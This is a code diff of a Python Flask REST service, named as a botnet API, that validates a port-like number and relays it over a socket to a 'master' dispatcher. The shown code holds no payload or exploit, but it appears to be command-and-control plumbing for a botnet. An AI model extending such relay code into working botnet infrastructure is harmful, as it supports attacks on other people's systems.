@@ -17,22 +17,17 @@ def control_print(msg):
 #Define dispatcher constants
 HOST = "127.0.0.1" #Preset IP of master //TODO change
 PORT = 25000
-API_SEND_SIZE = 8
+API_SEND_SIZE = 64
 
 #Connect to dispatcher
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 control_print("Attempting to establish conn with master.")
-#while(True):
-#    try:
 sock.connect((HOST, PORT))
 control_print("Established conn with master.");
-#        break
-#    except:
-#        continue
-
 
 app = Flask(__name__)
 api = Api(app)
+
 
 def exit_critical():
     sys.exit("Critical error has occured, exiting...")
@@ -44,18 +39,10 @@ def get_num():
 
 def send_num(num_str):
 
-    num_str_encoded = num_str
+    print(num_str)
+    sock.sendall(bytes(str(num_str), "utf-8"))
+    control_print("Num sent.")
 
-    #Add padding
-    for i in range(8 - len(num_str)):
-       num_str_encoded = num_str_encoded + '\0'
-
-    num_str_encoded = bytearray(num_str_encoded, 'utf-8')
-
-    control_print("Send num.")
-    sock.sendall(num_str_encoded)
-
-    print("Num sent.")
 
 # -1 = bad number, 0 = good number
 def check_num(num_str):
@@ -66,10 +53,11 @@ def check_num(num_str):
         return -1
 
     if num_int >= 0 and num_int <= 65535:
-        control_print("Check num success")
+        control_print("Check num success.")
         return 0
     else:
         return -1
+
 
 class Botnet_RESTAPI(Resource):
     #On receive
@@ -83,7 +71,8 @@ class Botnet_RESTAPI(Resource):
         else:
             send_num(num)
 
+
 #Start API on port 5000
 api.add_resource(Botnet_RESTAPI, '/post')
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port="5000", debug=True)
+    app.run(host="127.0.0.1", port="5000", debug=True)
